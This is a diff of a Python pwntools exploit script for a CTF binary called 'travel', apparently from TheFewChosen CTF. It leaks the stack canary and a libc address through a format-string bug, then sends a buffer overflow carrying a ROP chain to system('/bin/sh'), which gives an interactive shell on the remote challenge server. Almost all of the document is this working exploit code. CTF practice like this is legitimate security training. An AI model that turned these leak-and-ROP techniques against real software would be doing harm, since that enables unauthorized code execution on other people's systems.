@@ -6,10 +6,10 @@ context.log_level = 'WARNING'
 context.terminal = ['konsole', '-e']
 
 libc = ELF('./libc.so.6')
-libc_gtg = ROP(libc)
+libc_rop = ROP(libc)
 
 LOCAL = "./travel"
-REMOTE = ["01.linux.challenges.ctf.thefewchosen.com", 50106]
+REMOTE = ["01.linux.challenges.ctf.thefewchosen.com", 49802]
 
 class Exploit:
     def __init__(self, local=False, debug=False):
@@ -19,42 +19,56 @@ class Exploit:
             self.p = "remote(REMOTE[0], REMOTE[1])"
         
         self.debug = debug
-        self.canary_address = 33
-        self.buffer_max = 215
-        self.libc_base = 0x7faa483eb000
+        self.canary_address_leak = 33
+        self.libc_address_leak = 3
+        self.buffer_max = 200
     
-    def get_canary(self, proc):
+    def get_canary_and_libc(self, proc):
         'sending format string to leak the stack canary'
-        payload = (f"%{self.canary_address}$p").encode()
+        payload = (f"%{self.canary_address_leak}$p|%{self.libc_address_leak}$p").encode()
         p = proc.recv(100)
         p = proc.sendline(payload)
         p = proc.recvline().decode()
-        p = p[9:26]
-        p = pack("<Q", int(p, 16))
-        return p
+        
+        canary = p[9:25]
+        libc = p[28:40]
+        canary_address = pack("<Q", int(canary, 16))
+        libc_address = int(libc, 16) - 0x114a37 # 0x114a37 from my libc address - libc leaked address
+        return canary_address, libc_address
     
-    def return_to_libc(self, proc, canary):
+    def return_to_libc(self, proc, canary, libc_address):
+        '''Forging the ROP chain to get the shell'''
         if self.debug:
-            script = "b *main+323"
+            script = """
+            b *main+323
+            continue
+            next
+            next
+            """
             gdb.attach(proc, gdbscript=script)
         
-        payload = b"A"*(self.buffer_max-15)     # padding - formatstring
+        # Setting up the ROP chain
+        payload = b"A"*(self.buffer_max)        # padding
         payload += canary                       # canary value
         payload += b'\x90'*8                    # junk
         
-        p = 
+        # ROP chain
+        payload += pack("<Q", libc_address+libc_rop.find_gadget(["pop rdi","ret"])[0])
+        payload += pack("<Q", libc_address+next(libc.search(b'/bin/sh\x00')))
+        payload += pack("<Q", libc_address+libc_rop.find_gadget(["ret"])[0])
+        payload += pack("<Q", libc_address+libc.symbols.system)
         
-        payload += pack("<Q", self.libc_base)
-        
-        p = proc.recv(100)
-        p = proc.sendline(payload)
-        p = proc.recv(100)
+        # Sending the payload
+        proc.recv(100)
+        proc.sendline(payload)
+        proc.recv(100)
         proc.interactive()
         
     def start(self):
+        '''start the exploit'''
         with eval(self.p) as r:
-            canary = self.get_canary(r)
-            self.return_to_libc(r, canary)
+            canary, libc_address = self.get_canary_and_libc(r)
+            self.return_to_libc(r, canary, libc_address)
             
 
-Exploit(local=True, debug=True).start()
+Exploit(local=False, debug=False).start()
